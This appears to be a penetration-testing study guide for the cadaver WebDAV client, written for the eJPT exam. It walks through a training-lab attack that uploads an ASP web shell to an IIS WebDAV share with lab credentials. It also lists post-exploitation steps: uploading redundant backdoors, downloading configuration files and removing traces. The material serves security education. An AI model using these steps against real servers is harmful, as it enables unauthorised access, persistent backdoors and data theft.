# 🔧 Cadaver - WebDAV Command-Line Client

Interactive WebDAV client for manual file operations and exploitation

**Location in Framework:** `web-pentesting/file-upload/cadaver.md`

---

## 🎯 What is Cadaver?

Cadaver is a command-line WebDAV client that provides an interactive interface for connecting to WebDAV servers. It allows manual file operations including upload, download, directory management, and file manipulation on WebDAV-enabled web servers.

**Key Capabilities:**
- **Interactive WebDAV Access:** Command-line interface similar to FTP clients
- **Authentication Support:** Handles HTTP Basic and Digest authentication
- **File Operations:** Upload, download, copy, move, and delete files
- **Directory Management:** Create, list, and navigate WebDAV directories

Cadaver is particularly useful for manual exploitation after discovering WebDAV vulnerabilities with tools like davtest, allowing precise control over file upload and server interaction.

---

## 📦 Installation and Setup

### Prerequisites
- Kali Linux (pre-installed)
- WebDAV server credentials (if authentication required)
- Network connectivity to target

### Verification
```bash
# Verify cadaver installation
which cadaver
cadaver --version
```

**Expected Output:**
```
/usr/bin/cadaver
cadaver 0.23.3
```

---

## 🔧 Basic Usage and Syntax

### Essential Cadaver Workflow
```bash
# 1. Connect to WebDAV server
cadaver http://target/webdav

# 2. Authenticate when prompted
Username: bob
Password: password_123321

# 3. Navigate and perform operations
ls
put local_file.asp
```

### Core Command Structure
- **Connection:** `cadaver URL` - Connect to WebDAV server
- **Navigation:** `ls, cd, pwd` - Directory operations
- **File Operations:** `put, get, mput, mget` - File transfer commands

---

## ⚙️ Command Line Options

### Connection Commands
| Command | Description | Example |
|---------|-------------|---------|
| `cadaver URL` | Connect to WebDAV server | `cadaver http://target/webdav` |
| `open URL` | Open new connection | `open http://target/webdav` |
| `close` | Close current connection | `close` |
| `quit` | Exit cadaver | `quit` |

### File Operations
| Command | Description | Usage |
|---------|-------------|-------|
| `put localfile` | Upload file to server | `put webshell.asp` |
| `get remotefile` | Download file from server | `get index.html` |
| `mput pattern` | Upload multiple files | `mput *.txt` |
| `mget pattern` | Download multiple files | `mget *.asp` |

### Directory Operations
| Command | Description | Usage |
|---------|-------------|-------|
| `ls` | List directory contents | `ls` |
| `cd directory` | Change directory | `cd subfolder` |
| `pwd` | Print working directory | `pwd` |
| `mkdir dirname` | Create directory | `mkdir uploads` |

---

## 🧪 Real Lab Examples

### Lab: Windows IIS WebDAV File Upload Exploitation

**Scenario:** Using cadaver to manually upload ASP backdoor after davtest assessment
- **Target URL:** http://demo.ine.local/webdav
- **Authentication:** Basic Authentication (bob:password_123321)
- **Objective:** Upload and execute ASP web shell for remote code execution

#### Phase 1: WebDAV Connection and Authentication

**Step 1: Connect to WebDAV Server**
```bash
cadaver http://demo.ine.local/webdav
```

**Expected Lab Output:**
```
Authentication required for demo.ine.local on server `demo.ine.local':
Username: bob
Password: 
```

**Step 2: Enter Credentials**
```bash
# Enter provided credentials
Username: bob
Password: password_123321
```

**Expected Lab Output:**
```
dav:/webdav/> 
```

**Analysis:** Successful authentication indicated by the `dav:/webdav/>` prompt, confirming access to the WebDAV directory.

#### Phase 2: Directory Exploration and Assessment

**Step 3: Explore WebDAV Directory Structure**
```bash
ls
```

**Expected Lab Output:**
```
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_AqOeSdckMtf                   0  Jul 10 09:39
        AttackDefense.txt                       13  Jan  2  2021
        web.config                             168  Jan  2  2021

dav:/webdav/> 
```

**Analysis:** Directory contains the DavTestDir created by previous davtest scan, along with existing files AttackDefense.txt and web.config.

#### Phase 3: ASP Backdoor Upload

**Step 4: Upload ASP Web Shell**
```bash
put /usr/share/webshells/asp/webshell.asp
```

**Expected Lab Output:**
```
Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.

dav:/webdav/> 
```

**Step 5: Verify Upload Success**
```bash
ls
```

**Expected Lab Output:**
```
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_AqOeSdckMtf                   0  Jul 10 09:39
        AttackDefense.txt                       13  Jan  2  2021
        web.config                             168  Jan  2  2021
        webshell.asp                          1362  Jul 10 09:42

dav:/webdav/> 
```

**Analysis:** The webshell.asp file (1362 bytes) has been successfully uploaded to the WebDAV directory and is now accessible.

#### Phase 4: Backdoor Access and Verification

**Key Findings from Lab:**
- **Successful Upload:** ASP web shell uploaded without restrictions
- **File Accessibility:** Uploaded file appears in directory listing
- **File Size Preserved:** 1362 bytes indicates complete upload
- **Execution Ready:** ASP file ready for web-based execution

**Backdoor Access Information:**
- **Web Shell URL:** http://demo.ine.local/webdav/webshell.asp
- **Authentication Required:** bob:password_123321
- **Platform:** Windows IIS Server
- **Capabilities:** Command execution, file system access

---

## 🎯 eJPT Exam Focus

### Essential Cadaver Skills for eJPT Certification

#### 1. Manual WebDAV Exploitation
```bash
# Complete workflow for eJPT exam
cadaver http://target/webdav
# Enter credentials when prompted
ls
put backdoor.asp
ls
quit
```

#### 2. File Upload and Management
- **Backdoor Upload:** Precise control over web shell deployment
- **File Verification:** Confirm successful uploads with ls command
- **Directory Navigation:** Explore WebDAV directory structure
- **File Management:** Copy, move, and organize uploaded files

#### 3. Post-Exploitation Activities
- **Persistent Access:** Upload multiple backdoors for redundancy
- **File Exfiltration:** Download sensitive files from server
- **Directory Manipulation:** Create folders for organized access
- **Evidence Cleanup:** Remove test files and traces

### Common eJPT Exam Scenarios
- **WebDAV Exploitation:** Manual file upload after automated discovery
- **Web Shell Deployment:** Precise backdoor placement and verification
- **File System Exploration:** Navigate and explore server directories
- **Data Exfiltration:** Download configuration files and sensitive data

### Critical eJPT Commands to Memorize
```bash
# Essential cadaver session commands
cadaver http://target/webdav
ls
put webshell.asp
get web.config
quit
```

### eJPT Exam Tips
- **Time Management:** Use cadaver for precise manual operations after davtest
- **Common Mistakes:** Not verifying file uploads with ls command
- **Best Practices:** Always confirm successful upload before proceeding
- **Integration Points:** Use in conjunction with davtest for comprehensive testing

---

## ⚠️ Common Issues & Troubleshooting

### Issue 1: Authentication Required
```bash
# Problem symptoms
Authentication required for target on server 'target':

# Solution: Enter correct credentials
Username: username
Password: password
```

### Issue 2: Connection Refused
```bash
# Problem: Cannot connect to WebDAV server
Could not connect to server.

# Check network connectivity and service availability
nmap -p 80,443 target
curl -I http://target/webdav
```

### Issue 3: File Upload Failures
```bash
# Problem: Upload fails with permission errors
PUT request failed: 403 Forbidden

# Check authentication and directory permissions
# Try different directory locations
cd /
put file.txt
```

### Issue 4: SSL/TLS Certificate Issues
```bash
# For HTTPS WebDAV servers
cadaver https://target/webdav

# If certificate errors occur
# Use --insecure flag if available
# Or verify server certificate manually
```

---

## 🔗 Integration with Other Tools

### Pre-Cadaver Preparation
```bash
# Use davtest for initial assessment
davtest -auth user:pass -url http://target/webdav

# Then use cadaver for manual operations
cadaver http://target/webdav
```

### Integration with DAVTest
**Sequential Usage:**
1. **DAVTest for discovery:** Automated testing of WebDAV capabilities
2. **Cadaver for exploitation:** Manual file upload and management
3. **Combined approach:** Assessment followed by precise exploitation

```bash
# Assessment phase
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Exploitation phase
cadaver http://demo.ine.local/webdav
```

### Integration with Web Shells
```bash
# Upload web shell using cadaver
cadaver http://target/webdav
put /usr/share/webshells/asp/cmd.asp

# Access via web browser
firefox http://target/webdav/cmd.asp
```

### Integration with File Enumeration
```bash
# Download configuration files for analysis
cadaver http://target/webdav
get web.config
get .htaccess
get config.php
```

---

## 📝 Documentation and Reporting

### Evidence Collection

#### 1. Session Documentation
```bash
# Create evidence log for cadaver session
echo "Cadaver WebDAV Session:" > cadaver_evidence.txt
echo "=======================" >> cadaver_evidence.txt
echo "Date: $(date)" >> cadaver_evidence.txt
echo "Target: http://demo.ine.local/webdav" >> cadaver_evidence.txt
```

### Key Information to Document

#### Technical Details
- **Connection Information:**
  - WebDAV URL: http://demo.ine.local/webdav
  - Authentication: Basic Authentication (bob:password_123321)
  - Connection status: Successful
  - Server response: dav:/webdav/> prompt

#### File Operations
- **Uploads Performed:**
  - webshell.asp (1362 bytes) - ASP web shell
  - Upload status: 100% successful
  - File location: /webdav/webshell.asp

- **Directory Exploration:**
  - Initial directory listing performed
  - Existing files identified: AttackDefense.txt, web.config
  - Test directory from davtest: DavTestDir_AqOeSdckMtf

#### Security Impact
```
1. Successful Backdoor Deployment
   - ASP web shell uploaded successfully
   - Remote code execution capability established
   - Persistent access achieved

2. File System Access
   - Read/write access to WebDAV directory
   - Ability to upload arbitrary files
   - No apparent file type restrictions

3. Configuration Exposure
   - web.config file accessible for download
   - Potential for sensitive information disclosure
   - Server configuration details exposed
```
